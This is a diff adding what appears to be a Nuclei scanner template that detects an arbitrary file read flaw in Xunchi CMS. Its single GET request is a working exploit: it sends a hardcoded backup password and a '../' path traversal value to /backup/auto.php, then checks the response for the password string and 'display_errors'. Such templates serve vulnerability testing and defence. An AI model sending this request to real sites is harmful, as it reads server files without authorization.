@@ -1,0 +1,24 @@
+id: CNVD-2020-23735
+info:
+  author: princechaddha
+  description: Xunyou cms has an arbitrary file reading vulnerability. Attackers can
+    use vulnerabilities to obtain sensitive information.
+  name: Xxunchi Local File read
+  reference: https://www.cnvd.org.cn/flaw/show/2025171
+  severity: medium
+  tags: xunchi,lfi,cnvd
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - NzbwpQSdbY06Dngnoteo2wdgiekm7j4N
+    - display_errors
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php'
